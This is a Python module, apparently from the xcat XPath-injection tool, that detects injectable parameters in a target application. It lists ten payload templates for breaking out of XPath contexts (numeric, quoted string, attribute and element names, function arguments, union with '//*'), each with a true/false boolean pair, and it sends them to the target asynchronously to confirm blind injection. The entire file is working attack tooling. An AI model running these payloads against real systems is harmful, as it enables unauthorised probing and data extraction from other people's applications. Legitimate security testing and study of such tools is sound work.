import asyncio
from typing import List

from xpath import E

from xcat.attack import AttackContext, Injection, check

injectors = [
    Injection('integer',
              "/lib/book[id=?]",
              (
                  ('{working} and 1=1', True),
                  ('{working} and 1=2', False)
              ),
              "{working} and {expression}"),
    Injection('string - single quote',
              "/lib/book[name='?']",
              (
                  ("{working}' and '1'='1", True),
                  ("{working}' and '1'='2", False),
              ),
              "{working}' and {expression} and '1'='1"),
    Injection('string - double quote',
              '/lib/book[name="?"]',
              (
                  ('{working}" and "1"="1', True),
                  ('{working}" and "1"="2', False),
              ),
              '{working}" and {expression} and "1"="1'),
    Injection('attribute name - prefix',
              "/lib/book[?=value]",
              (
                  ("1=1 and {working}", True),
                  ("1=2 and {working}", False)
              ),
              lambda working, expression: expression & E(working)),
    Injection('attribute name - postfix',
              "/lib/book[?=value]",
              (
                  ("{working} and not 1=2 and {working}", True),
                  ("{working} and 1=2 and {working}", False)
              ),
              lambda working, expression: working & expression & E(working)),
    Injection('element name - prefix',
              "/lib/something?/",
              (
                  (".[true()]/{working}", True),
                  (".[false()]/{working}", False)
              ),
              lambda working, expression: E('.')[expression].add_path('/' + working)),
    Injection('element name - postfix',
              "/lib/?something",
              (
                  ("{working}[true()]", True),
                  ("{working}[false()]", False)
              ),
              lambda working, expression: E(working)[expression]),
    Injection('function call - last string parameter - single quote',
              "/lib/something[function(?)]",
              (
                  ("{working}') and true() and string('1'='1", True),
                  ("{working}') and false() and string('1'='1", False),
              ),
              "{working}') and {expression} and string('1'='1"),
    Injection('function call - last string parameter - double quote',
              "/lib/something[function(?)]",
              (
                  ('{working}") and true() and string("1"="1', True),
                  ('{working}") and false() and string("1"="1', False),
              ),
              '{working}") and {expression} and string("1"="1'),
    Injection('other elements - last string parameter - double quote',
              "/lib/something[function(?) and false()] | //*[?]",
              (
                  ('{working}") and false()] | //*[true() and string("1"="1', True),
                  ('{working}") and false()] | //*[false() and string("1"="1', False),
              ),
              '{working}") and false()] | //*[{expression} and string("1"="1')

]


async def detect_injections(context: 'AttackContext') -> List[Injection]:
    working_value = context.target_parameter_value

    returner = []

    for injector in injectors:
        payloads = injector.test_payloads(working_value)
        result_futures = [
            check(context, test_payload)
            for test_payload, expected in payloads
        ]

        results = await asyncio.gather(*result_futures)

        if all(result == expected for result, (_, expected) in zip(results, payloads)):
            returner.append(injector)

    return returner
